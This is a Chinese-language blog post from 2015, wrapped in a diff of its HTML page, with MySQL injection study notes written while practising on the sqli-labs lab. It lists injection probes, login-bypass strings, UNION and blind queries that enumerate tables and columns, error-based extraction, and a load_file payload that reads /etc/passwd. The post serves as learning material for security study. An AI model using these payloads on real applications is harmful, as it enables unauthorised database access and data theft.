@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+      <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="canonical" href="/article/an-quan/MySql注入.html" />
+
+    <title>  Avalon &mdash; MySql注入
+</title>
+
+
+
+
+    <link rel="stylesheet" href="/theme/css/style.css">
+
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+
+    <meta name="author" content="莲的思念">
+    <meta name="description" content="原文地址 默认存在的数据库 mysql：需要root权限 information_schema：5以上版本有 测试是否存在注入方法 真：表示查询是正常，页面返回与原来相同； 假：表示查询是错误的 字符串查询： ' 假 '' 真 " 假 "" 真 \ 假 \ 真 数字类型查询： and 1 真 and 0 假 1-false 有问题时返回1的结果 1-true 有问题时返回0的结果 登录时： 'or'1 'or 1 --+ "or ""=" "or 1=1 --+ '=' 'LIKE' 注释 ：Hash语法, URL上可能被转码，用%23 /.../：语句块注释 -- :Sql语法，双划线后要有空格, URL上后面跟+或 ...">
+  <meta name="tags" contents="">
+</head>
+
+<body>
+<header class="header">
+  <div class="container">
+    <div class="header-inner">
+      <h1 class="header-name">
+        <a class="nodec" href="/">Avalon</a>
+      </h1>
+      <h3 class="header-text">忆惜往日如作梦，月洒清辉映琉璃。</h3>
+      <ul class="header-menu list-inline">
+		<li><a class="nodec" href="/category/an-quan.html">安全</a></li>
+		<li><a class="nodec" href="/category/miscellaneous.html">miscellaneous</a></li>
+		<li><a class="nodec" href="/category/python.html">Python</a></li>
+		<li><a class="nodec" href="/category/wang-luo.html">网络</a></li>
+		
+      </ul>
+    </div>
+  </div>
+</header> <!-- /.header -->  <div class="container">
+  <div class="post full-post">
+    <h1 class="post-title">
+		<a href="/article/an-quan/MySql注入.html" title="MySql注入">MySql注入</a>
+    </h1>
+    <ul class="list-inline">
+      <li class="post-date">
+        <a class="text-muted" title="2015-10-28T00:00:00+08:00">2015年10月28日</a>
+      </li>
+      <li class="muted">&middot;</li>
+      <li class="post-category">
+	  <a href="/category/an-quan.html">安全</a>
+      </li>
+    </ul>
+    <div class="post-content">
+      <p><a href="http://drops.wooyun.org/tips/123">原文地址</a></p>
+<h3> 默认存在的数据库 </h3>
+
+<div class="highlight"><pre>mysql：需要root权限
+information_schema：5以上版本有
+</pre></div>
+
+
+<h3> 测试是否存在注入方法 </h3>
+
+<p>真：表示查询是正常，页面返回与原来相同；
+假：表示查询是错误的</p>
+<p>字符串查询：</p>
+<ul>
+<li>'   假</li>
+<li>''  真</li>
+<li>"   假</li>
+<li>""  真</li>
+<li>\   假</li>
+<li>\  真</li>
+</ul>
+<p>数字类型查询：</p>
+<ul>
+<li>and 1    真</li>
+<li>and 0    假</li>
+<li>1-false  有问题时返回1的结果</li>
+<li>1-true   有问题时返回0的结果</li>
+</ul>
+<p>登录时：</p>
+<ul>
+<li>'or'1</li>
+<li>'or 1 --+</li>
+<li>"or ""="</li>
+<li>"or 1=1 --+</li>
+<li>'='</li>
+<li>'LIKE'</li>
+</ul>
+<h3> 注释 </h3>
+
+<ul>
+<li>
+<h1>：Hash语法, URL上可能被转码，用%23</h1>
+</li>
+<li>/<em>...</em>/：语句块注释</li>
+<li>-- :Sql语法，双划线后要有空格, URL上后面跟+或%20</li>
+</ul>
+<h3> 数据库认证信息 </h3>
+
+<div class="highlight"><pre> 表：mysql.user
+ 字段：user, password
+ 当前用户：user(), current_user，current_user()
+
+ 表：information_schema.schemata, mysql.db
+ 字段：schema_name, db
+ 当前数据库：database()，schema()
+
+ 服务器名：@@hostname
+</pre></div>
+
+
+<h3> 检测字段数 </h3>
+
+<p>order by判断</p>
+<div class="highlight"><pre> order by n+1，让n一直增加直到出错, 结果n是查询的字段数.
+</pre></div>
+
+
+<p>基于错误的查询</p>
+<div class="highlight"><pre> and (select * from table)=1.此种方法需知道所要查询的表名，返回的是表的字段数。
+</pre></div>
+
+
+<h3> 查询表名 </h3>
+
+<p>Uion方式：</p>
+<div class="highlight"><pre> union select group_concat(table_name) from information_schema.tables where table_schema=&quot;数据库名&quot;; --     查询某数据库的所有表，如果显示的结果为column数不同可以用Null来替代
+</pre></div>
+
+
+<p>盲注：</p>
+<div class="highlight"><pre>and select substr(table_name, 1, 1)=&#39;A&#39; from information_schema.tables--+
+</pre></div>
+
+
+<h3> 查询列名 </h3>
+
+<p>Union方式：</p>
+<div class="highlight"><pre> union select group_concat(column_name) from information_schema.columns where table_name=&quot;表名&quot; and table_schema=&quot;数据库名&quot;--+  同名的表可能有很多，像users表在information_schema库中就有，因此要过滤。
+</pre></div>
+
+
+<p>盲注：</p>
+<div class="highlight"><pre> and select substr(column_name, 1, 1)=&#39;A&#39; from information_schema.columns where table_name=&quot;表明&quot; and table_schema=&quot;数据库名&quot;;--+
+</pre></div>
+
+
+<p><strong>注：可以先猜字段数，然后如果有显示则根据database()知道数据库名，再猜表名，猜列名。</strong></p>
+<h2> Sqli-lab感悟 </h2>
+
+<ol>
+<li>单、双引号测试，构造非成对引号引发错误。</li>
+<li>--双划线后需加%20或'+', #注释在URL上可能会被转义，使用%23</li>
+<li>') 或 ")     </li>
+<li>union select 后的字段数需和前面的select字段数相同，因此可通过基于错误的测试猜出字段数。</li>
+<li>如果不用注释可以通过or或者and。eg：where id='' or '1' 即使id错误也能获得所有的项。</li>
+<li>select count(*) from information_schema.tables; 会返回行数。</li>
+<li>select count(<em>), concat((select database()), 0x3a, floor(rand()</em>5))a from information_schema.tables group by a; 有时会因为引发键重复错误而将错误信息返回，其中会包含数据库名，可以将database()换成version()来查看版本。</li>
+<li>select * from table_name into outfile "file_name"：会将查询结果放到文件中。</li>
+<li>select load_file("file_name")：载入文件。</li>
+<li>select load_file("/etc/passwd") into outfile "file_name"：可以下载passwd文件</li>
+</ol>
+<p>一些奇技淫巧：</p>
+<p><a href="http://drops.wooyun.org/tips/132">原文地址</a></p>
+<ol>
+<li>` ：可以用来过空格和一些正则。eg：<pre>select<code>version</code>();</pre> 还可以用来当注释符（限定条件）：<pre>select id from table_name where id=1; `comment</pre></li>
+<li>-/+: select-id+1-1.from table_name;  -和+可以理解成就是减/加。   </li>
+</ol>
+    </div>
+  </div>
+  <hr class="separator">
+  <div class="col-md-8 col-md-offset-2">
+  <div id="disqus_thread">
+    <script>
+      var disqus_shortname = 'liandesinian';
+      (function() {
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] ||
+         document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+    </script>
+    <noscript>
+      Please enable JavaScript to view the
+      <a href="https://disqus.com/?ref_noscript=liandesinian">
+        comments powered by Disqus.
+      </a>
+    </noscript>
+    <a href="https://disqus.com" class="dsq-brlink">
+      blog comments powered by <span class="logo-disqus">Disqus</span>
+    </a>
+  </div>
+  </div>
+  </div>
+<footer class="footer">
+  <div class="container">
+    <p class="text-center">
+      莲的思念, <a href="" target="_blank"></a> unless otherwise noted.
+    </p>
+    <div class="text-center">
+      Generated by <a href="http://getpelican.com" target="_blank">Pelican</a> with the <a href="http://github.com/nairobilug/pelican-alchemy">alchemy</a> theme.
+    </div>
+  </div>
+</footer> <!-- /.footer -->
+  <script src="/theme/js/jquery.min.js"></script>
+  <script src="/theme/js/bootstrap.min.js"></script>
+</body> <!-- 42 -->
+
+</html>
